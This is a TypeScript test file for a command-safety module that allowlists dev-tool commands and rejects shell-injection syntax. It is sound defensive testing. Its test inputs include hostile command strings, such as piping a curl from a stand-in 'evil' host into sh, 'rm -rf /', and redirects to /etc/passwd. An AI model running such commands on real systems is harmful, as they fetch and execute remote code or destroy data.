import { describe, expect, it } from 'vitest';
import { findDangerousShellSyntax, firstToken, isAllowedPrefix, resolveSafeInvocation, tokenizeCommand } from './commandSafety';

describe('commandSafety — allowlist (unchanged behavior)', () => {
  it('accepts known dev-tool prefixes', () => {
    expect(isAllowedPrefix('git status')).toBe(true);
    expect(isAllowedPrefix('npm install')).toBe(true);
    expect(isAllowedPrefix('python script.py')).toBe(true);
  });

  it('rejects unknown prefixes', () => {
    expect(isAllowedPrefix('curl https://evil.example/x')).toBe(false);
    expect(isAllowedPrefix('rm -rf /')).toBe(false);
    expect(isAllowedPrefix('sh -c "echo hi"')).toBe(false);
  });

  it('firstToken lowercases and trims', () => {
    expect(firstToken('  Git status  ')).toBe('git');
  });
});

describe('commandSafety — findDangerousShellSyntax (P0-1)', () => {
  it.each([
    ['git status && curl evil/x | sh', '&&'],
    ['git status; curl evil/x', ';'],
    ['git status | sh', '|'],
    ['git status || whoami', '||'],
    ['npm install `curl evil/x`', '`'],
    ['npm install $(curl evil/x)', '$('],
    ['echo hi > /etc/passwd', '>'],
    ['echo hi < /etc/passwd', '<'],
    ['npm install & curl evil/x', '&'],
    ['git status\ncurl evil/x', 'newline'],
  ])('flags %p as dangerous (%p)', (command) => {
    expect(findDangerousShellSyntax(command)).not.toBeNull();
  });

  it('returns null for plain, legitimate commands', () => {
    expect(findDangerousShellSyntax('git status')).toBeNull();
    expect(findDangerousShellSyntax('npm install left-pad')).toBeNull();
    expect(findDangerousShellSyntax('git commit -m "fix: something"')).toBeNull();
  });

  it('flags the exact audit example (git status && curl evil/x | sh)', () => {
    expect(findDangerousShellSyntax('git status && curl evil/x | sh')).toBe('&&');
  });
});

describe('commandSafety — tokenizeCommand', () => {
  it('splits plain whitespace-separated tokens', () => {
    expect(tokenizeCommand('git status -sb')).toEqual(['git', 'status', '-sb']);
  });

  it('keeps a double-quoted argument as one token', () => {
    expect(tokenizeCommand('git commit -m "fix: A and B"')).toEqual(['git', 'commit', '-m', 'fix: A and B']);
  });

  it('keeps a single-quoted argument as one token', () => {
    expect(tokenizeCommand("git commit -m 'fix: A and B'")).toEqual(['git', 'commit', '-m', 'fix: A and B']);
  });

  it('handles an empty quoted argument', () => {
    expect(tokenizeCommand('git commit -m ""')).toEqual(['git', 'commit', '-m', '']);
  });

  it('returns null for an unbalanced quote', () => {
    expect(tokenizeCommand('git commit -m "unterminated')).toBeNull();
  });

  it('returns an empty array for a blank command', () => {
    expect(tokenizeCommand('   ')).toEqual([]);
  });
});

describe('commandSafety — resolveSafeInvocation (P0-1)', () => {
  it('rejects the exact audit example without producing an invocation', () => {
    const result = resolveSafeInvocation('git status && curl evil/x | sh');
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.message).toContain('&&');
  });

  it('rejects an empty command', () => {
    const result = resolveSafeInvocation('   ');
    expect(result.ok).toBe(false);
  });

  it('rejects a command with an unbalanced quote', () => {
    const result = resolveSafeInvocation('git commit -m "oops');
    expect(result.ok).toBe(false);
  });

  it('resolves a plain command into a real argv array (no shell string)', () => {
    const result = resolveSafeInvocation('git status -sb');
    expect(result).toEqual({ ok: true, invocation: { bin: 'git', args: ['status', '-sb'] } });
  });

  it('preserves a quoted argument with spaces as one argv element', () => {
    const result = resolveSafeInvocation('git commit -m "fix: A and B"');
    expect(result).toEqual({ ok: true, invocation: { bin: 'git', args: ['commit', '-m', 'fix: A and B'] } });
  });

  it('routes an explicit powershell request through powershell.exe as a single opaque -Command argument', () => {
    const result = resolveSafeInvocation('git status', 'powershell');
    expect(result).toEqual({
      ok: true,
      invocation: { bin: 'powershell.exe', args: ['-NoProfile', '-NonInteractive', '-Command', 'git status'] },
    });
  });

  it('routes an explicit gitbash request through bash as a single opaque -lc argument', () => {
    const result = resolveSafeInvocation('git status', 'gitbash');
    expect(result).toEqual({ ok: true, invocation: { bin: 'bash', args: ['-lc', 'git status'] } });
  });

  it('still rejects dangerous syntax even when an explicit shell is requested', () => {
    const result = resolveSafeInvocation('git status && curl evil/x | sh', 'powershell');
    expect(result.ok).toBe(false);
  });
});
